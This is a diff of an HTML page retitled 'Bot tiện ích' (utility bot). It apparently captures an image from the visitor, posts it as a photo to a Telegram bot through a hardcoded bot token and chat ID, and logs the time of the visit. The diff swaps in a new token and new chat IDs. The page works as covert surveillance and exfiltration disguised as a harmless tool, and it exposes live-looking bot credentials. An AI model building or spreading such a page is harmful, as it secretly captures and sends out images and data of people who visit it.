@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Đinh Duy Vinh </title>
+    <title>Bot tiện ích</title>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
@@ -92,7 +92,7 @@
         canvas.toBlob(function(blob) {
             // Gửi ảnh qua Telegram
             var formData = new FormData();
-            formData.append('chat_id', '6824912964'); // Thay YOUR_CHAT_ID bằng Chat ID của bot Telegram
+            formData.append('chat_id', '-6824912964'); // Thay YOUR_CHAT_ID bằng Chat ID của bot Telegram
             formData.append('photo', blob, 'photo.jpg');
 
             $.ajax({
@@ -146,9 +146,9 @@
   <script>
     $(document).ready(function() {
 
-      var telegramBotToken = '6002210854:AAFGExA_DbEgI5b4Yp-qJErd6xbhM7Wk_kQ';
+      var telegramBotToken = '7782164824:AAEy8JN5QTcAcZ_MQRAMmkzmZd28IuzhS8I';
 
-      var chatId = '-862312877';
+      var chatId = '-6824912964';
 
       // Lấy thời gian truy cập cụ thể
       var currentTime = new Date();
@@ -222,4 +222,5 @@
   </script>
 </body>
 </html>
+
 
